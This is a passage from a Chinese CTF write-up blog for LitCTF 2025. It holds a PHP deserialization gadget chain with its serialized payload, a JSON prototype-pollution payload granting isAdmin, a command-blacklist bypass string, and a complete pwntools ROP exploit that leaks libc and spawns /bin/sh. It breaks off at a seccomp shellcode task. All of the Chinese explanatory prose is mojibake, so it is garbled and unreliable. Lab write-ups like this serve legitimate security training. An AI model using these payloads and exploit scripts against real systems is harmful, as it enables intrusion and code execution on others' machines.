class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thread</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kuchikamizake</span> = <span class="string">&quot;ReflectionFunction&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;\000lambda_1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Taki</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Mitsuha</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">KatawareDoki</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;musubi = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;thread = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;soul = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#C%3A11%3A%22ArrayObject%22%3A244%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D</span></span><br></pre></td></tr></table></figure><p>â€‹ <code>create_function</code>  åˆ›å»ºçš„åŒ¿åå‡½æ•°å†…éƒ¨åç§°ä¸º  <code>\000lambda_1</code> ï¼ˆPHP å†…éƒ¨å‘½åè§„åˆ™ï¼Œ\000 æ˜¯ç§æœ‰å±æ€§æ ‡è¯†ï¼‰ï¼Œæ‰§è¡Œ  <code>die(</code> /readflag <code>)</code> ï¼›å½“ç„¶ï¼Œå¦‚æœæ‰§è¡Œè¿™ä¸ªä¹‹åå¤±è´¥äº†ï¼Œé‡å¯å®¹å™¨å¹¶ä¸”ä¸åˆ·æ–°é¡µé¢ç›´æ¥æ‰§è¡Œ payload çœ‹çœ‹ï¼Œå› ä¸ºæ¯ä¸€æ¬¡åˆ·æ–°åŒ¿åå‡½æ•°åå­—éƒ½ä¼šå˜ã€‚</p><blockquote><p>create_function åˆ›å»ºçš„åŒ¿åå‡½æ•°ï¼Œåœ¨ PHP å†…éƒ¨ä¼šè¢«å‘½åä¸º  <code>lambda_æ•°å­—</code> ï¼ˆç¬¬ä¸€ä¸ªåˆ›å»ºçš„æ˜¯ lambda_1ï¼‰ï¼Œä¸”åç§°å‰ç¼€å¸¦æœ‰ \000ï¼ˆç§æœ‰å±æ€§æ ‡è¯†ï¼‰ï¼Œå› æ­¤å¿…é¡»ç”¨ \000lambda_1 æ‰èƒ½æ­£ç¡®åŒ¹é…ã€‚</p></blockquote><p>â€‹å¤§æ¦‚çš„é“¾å­æ˜¯è¿™æ ·çš„ï¼š</p><blockquote><p>Taki::__unserialize â†’ Mitsuha::__invoke â†’ KatawareDoki::__toString â†’ Taki::__call â†’ åŒ¿åå‡½æ•°æ‰§è¡Œ /readflag</p></blockquote><p>â€‹æœ€åä¸€æ­¥ <code> (new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;();</code>  å¯ä»¥é€šè¿‡åå°„è°ƒç”¨ <code>\000lambda_1</code> ï¼Œ</p><p>â€‹è¿™ä¸ªé¢˜å°±æœ€åä¸€æ­¥åå°„éœ€è¦è¯´ä¸‹ï¼Œæœ€åä¸€æ­¥åˆ°äº†é‚£é‡Œçš„æ—¶å€™ï¼Œå…¶é•¿ç›¸å·²ç»å˜æˆäº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;\000lambda_1&quot;</span>)-&gt;<span class="title function_ invoke__">invoke</span>();</span><br></pre></td></tr></table></figure><p>â€‹æœ€åçš„ invoke æ˜¯è¿›è¡Œæ‰§è¡Œçš„ï¼ŒåŠ äº†æ‰ä¼šæ­£å¼è°ƒç”¨ã€‚</p><h2 id="litctf-2025å¤šé‡å®‡å®™æ—¥è®°"><a class="markdownIt-Anchor" href="#litctf-2025å¤šé‡å®‡å®™æ—¥è®°">#</a> [LitCTF 2025] å¤šé‡å®‡å®™æ—¥è®°</h2><p>â€‹æç¤ºæ˜¯åŸå‹é“¾æ±¡æŸ“ï¼Œå…ˆæ³¨å†Œä¸ªè´¦å·è¿›å»çœ‹çœ‹ï¼Œç›´æ¥è¿›å»çœ‹åˆ°äº†ä¸ªç›´æ¥æäº¤ JSON çš„ç‚¹ï¼Œè®¿é—®æºç çœ‹åˆ°äº†æ›´æ–°é€»è¾‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ›´æ–°è¡¨å•çš„JSæäº¤</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;profileUpdateForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">            event.<span class="title function_">preventDefault</span>();</span><br><span class="line">            <span class="keyword">const</span> statusEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;updateStatus&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> currentSettingsEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">            statusEl.<span class="property">textContent</span> = <span class="string">&#x27;æ­£åœ¨æ›´æ–°...&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(event.<span class="property">target</span>);</span><br><span class="line">            <span class="keyword">const</span> settingsPayload = &#123;&#125;;</span><br><span class="line">            <span class="comment">// æ„å»º settings å¯¹è±¡ï¼ŒåªåŒ…å«æœ‰å€¼çš„å­—æ®µ</span></span><br><span class="line">            <span class="keyword">if</span> (formData.<span class="title function_">get</span>(<span class="string">&#x27;theme&#x27;</span>)) settingsPayload.<span class="property">theme</span> = formData.<span class="title function_">get</span>(<span class="string">&#x27;theme&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (formData.<span class="title function_">get</span>(<span class="string">&#x27;language&#x27;</span>)) settingsPayload.<span class="property">language</span> = formData.<span class="title function_">get</span>(<span class="string">&#x27;language&#x27;</span>);</span><br><span class="line">            <span class="comment">// ...å¯ä»¥æ·»åŠ å…¶ä»–å­—æ®µ</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">                    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                    <span class="attr">headers</span>: &#123;</span><br><span class="line">                        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">settings</span>: settingsPayload &#125;) <span class="comment">// åŒ…è£…åœ¨ &quot;settings&quot;é”®ä¸‹</span></span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">                <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;æˆåŠŸ: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                    currentSettingsEl.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result.<span class="property">settings</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">                    <span class="comment">// åˆ·æ–°é¡µé¢ä»¥æ›´æ–°å¯¼èˆªæ ï¼ˆå¦‚æœisAdminçŠ¶æ€æ”¹å˜ï¼‰</span></span><br><span class="line">                    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;é”™è¯¯: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;è¯·æ±‚å¤±è´¥: &#x27;</span> + error.<span class="title function_">toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="comment">// å‘é€åŸå§‹JSONçš„å‡½æ•°</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">sendRawJson</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> rawJson = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rawJsonSettings&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">            <span class="keyword">const</span> statusEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rawJsonStatus&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> currentSettingsEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">            statusEl.<span class="property">textContent</span> = <span class="string">&#x27;æ­£åœ¨å‘é€...&#x27;</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> parsedJson = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawJson); <span class="comment">// ç¡®ä¿æ˜¯åˆæ³•çš„JSON</span></span><br><span class="line">                <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">                    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                    <span class="attr">headers</span>: &#123;</span><br><span class="line">                        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(parsedJson) <span class="comment">// ç›´æ¥å‘é€ç”¨æˆ·è¾“å…¥çš„JSON</span></span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">                <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;æˆåŠŸ: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                    currentSettingsEl.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result.<span class="property">settings</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">                     <span class="comment">// åˆ·æ–°é¡µé¢ä»¥æ›´æ–°å¯¼èˆªæ ï¼ˆå¦‚æœisAdminçŠ¶æ€æ”¹å˜ï¼‰</span></span><br><span class="line">                    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;é”™è¯¯: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                 statusEl.<span class="property">textContent</span> = <span class="string">&#x27;è¯·æ±‚å¤±è´¥æˆ–JSONæ— æ•ˆ: &#x27;</span> + error.<span class="title function_">toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>â€‹åœ¨æ›´æ–°è®¾ç½®è¡¨å•é‡Œéšä¾¿è¾“å…¥å†…å®¹ï¼ŒæŠ“åŒ…å‘é€å‘ç°å‘çš„åŒ…æ˜¯ JSON æ ¼å¼ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/profile/update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;theme&quot;</span><span class="punctuation">:</span><span class="string">&quot;15&quot;</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>â€‹æ³¨é‡Šé‡Œæœ‰ä¸ªæç¤ºï¼Œæœ‰ä¸ªå‚æ•° <code>isAdmin</code>  å¯èƒ½æœ‰ç”¨ï¼Œä¸€èˆ¬ç”¨æˆ·çŒœæµ‹è¿™ä¸ªå‚æ•°ä¸º falseï¼Œé‚£ä¹ˆæ”¹ä¸º true åº”è¯¥å°±èƒ½è¿‡äº†å§ã€‚</p><p>â€‹payload å¦‚ä¸‹ï¼Œçœ‹äº†ä¸‹å¤§ä½¬ä»¬çš„ wpï¼Œè¿™ä¸ªä¼¼ä¹æ˜¯éé¢„æœŸã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/profile/update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;theme&quot;</span><span class="punctuation">:</span><span class="string">&quot;15&quot;</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>â€‹é¢„æœŸè§£åº”è¯¥æ˜¯è¿™ä¸ªï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/profile/update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">        <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">            <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span></span><br><span class="line"><span class="language-json">        <span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json">    <span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn</h1><h2 id="litctf-2025test_your_nc"><a class="markdownIt-Anchor" href="#litctf-2025test_your_nc">#</a> [LitCTF 2025]test_your_nc</h2><p>â€‹åç¼–è¯‘é™„ä»¶å¥½åƒç¼–è¯‘ä¸äº†ï¼Œä½†æ˜¯å­˜åœ¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seg000:000000000000001A                 db <span class="string">&#x27;print(&quot;input your command&quot;)&#x27;</span>,0Ah</span><br></pre></td></tr></table></figure><p>â€‹ä¼¼ä¹æ˜¯ä¸ª python ä»£ç ï¼Œç”¨æ–‡æœ¬æ–¹å¼æ‰“å¼€çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;input your command&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br></pre></td></tr></table></figure><p>â€‹å°±æ˜¯æ­£å¸¸è¿‡æ»¤å•Šï¼ŒWeb å¸¸è€ƒç‚¹ï¼Œç”¨ <code>ca''t$IFS$9f*</code>  å¯ä»¥è¯»å–åˆ° flagã€‚</p><h2 id="litctf-2025master_of_rop"><a class="markdownIt-Anchor" href="#litctf-2025master_of_rop">#</a> [LitCTF 2025]master_of_rop</h2><p>â€‹çœ‹çœ‹ä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>â€‹æœ‰ NXï¼Œåç¼–è¯‘å¾ˆç®€å•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to LitCTF2025!&quot;</span>);</span><br><span class="line">  gets(v4, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æœ‰ ld å’Œ libc æ–‡ä»¶ï¼Œæ‰“ ret2getsï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">29371</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x4011AD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">attach(p, <span class="string">&#x27;b *0x4011D9&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to LitCTF2025!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(gets_plt) + p64(gets_plt)</span><br><span class="line">payload += p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(p32(<span class="number">0</span>) + <span class="string">b&quot;AAAA&quot;</span> + <span class="string">b&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x28c0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x10f75b</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to LitCTF2025!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload += p64(<span class="number">0x40101a</span>) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="litctf-2025shellcode"><a class="markdownIt-Anchor" href="#litctf-2025shellcode">#</a> [LitCTF 2025]shellcode</h2><p>â€‹çœ‹ä¸‹ä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>â€‹æœ‰æ²™ç®±ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~$ seccomp-tools dump ./pwn</span><br><span class="line">Welcome LitCTF 2025</span><br><span class="line">Please input your shellcode: </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>â€‹64 ä½ï¼Œread è¢« banï¼Œåªæœ‰ openï¼Œåç¼–è¯‘çœ‹çœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 